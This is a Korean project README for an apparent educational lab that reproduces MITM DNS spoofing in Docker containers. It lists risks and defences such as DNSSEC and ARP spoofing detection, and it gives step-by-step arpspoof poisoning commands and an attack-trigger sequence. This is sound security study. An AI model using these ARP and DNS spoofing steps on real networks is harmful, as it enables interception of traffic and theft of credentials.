## 프로젝트 개요
MITM 환경에서 DNS Spoofing 공격 과정을 재현하고,
공격 발생 원리와 네트워크 보안 위험을 분석한 팀 프로젝트.

## 담당 역할
- Docker 기반 공격·피해 환경 구성
- ARP Spoofing 및 DNS 응답 변조 실습
- 공격 결과 검증 및 문서화
- 대응 방안 조사

## 주요 보안 위험
- DNS 응답 변조로 인한 악성 사이트 유도
- 중요 계정정보 및 개인정보 탈취 가능성
- 내부 네트워크 신뢰 구조 악용

## 대응 방안
- DNSSEC 적용
- 정적 ARP 및 ARP Spoofing 탐지
- 네트워크 세분화와 비정상 트래픽 모니터링
- 중요 서비스 HTTPS 인증서 검증

# MITM 기반 DNS Spoofing

### [참고] 타겟 ip 확인하기
- 리졸버 IP 확인: `docker exec -it resolver hostname -i` (기본값: 172.20.0.20)
- 권한 서버 IP 확인: `docker exec -it auth hostname -i` (기본값: 172.20.0.10)

### 실행 순서 및 명령어 가이드
1. 공격자 환경 세팅 (arpspoof 설치)
docker exec -it attacker apt-get update
docker exec -it attacker apt-get install -y dsniff

2. arp spoofing - 터미널 탭 2개 열기
탭1: 리졸버에게 권한 서버라고 속이기
docker exec -it attacker arpspoof -i eth0 -t 172.20.0.20 172.20.0.10

탭2: 권한 서버에게 리졸버라 속이기
docker exec -it attacker arpspoof -i eth0 -t 172.20.0.10 172.20.0.20


3. 새로운 터미널 열고 snifer 파이썬 코드 실행
docker cp sniper.py attacker:/app/sniper.py (파일이 컨테이너 내부에 없다면 호스트에서 복사)
docker exec -it attacker python3 /app/sniper.py

4. 공격 트리거 및 결과 확인
1) 리졸버 캐시 초기화
docker exec -it resolver rndc flush

2) 피해자 질의 발생
dig @localhost -p 10053 bank.test

<img width="724" height="899" alt="스크린샷 2026-05-04 오후 5 03 27" src="https://github.com/user-attachments/assets/b5b25e26-3c20-4edc-8914-6d78492bbf47" />
위 사진처럼 d클래스가 60으로 바뀐것을 확인할 수 있음

  
